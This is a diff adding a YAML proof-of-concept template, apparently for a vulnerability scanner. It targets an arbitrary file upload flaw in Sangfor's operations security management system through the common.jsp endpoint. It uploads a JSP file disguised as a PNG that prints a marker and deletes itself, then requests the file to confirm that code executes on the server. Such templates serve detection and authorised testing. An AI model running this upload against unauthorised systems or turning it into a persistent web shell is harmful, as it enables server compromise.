@@ -1,0 +1,49 @@
+id: poc-yaml-sangfor-osm-common-jsp-anyfile-upload
+info:
+  name: 深信服运维安全管理系统 common.jsp 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(7)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload
+    method: POST
+    path:
+      - "/fort/trust/version/common/common.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----geckoformboundaryf079b5206c15039ed1e6fe97927beff5"
+    body: |-
+      ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/png
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Upload success"
+  
+  - id: verify
+    method: GET
+    path:
+      - "/fort/trust/version/common/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
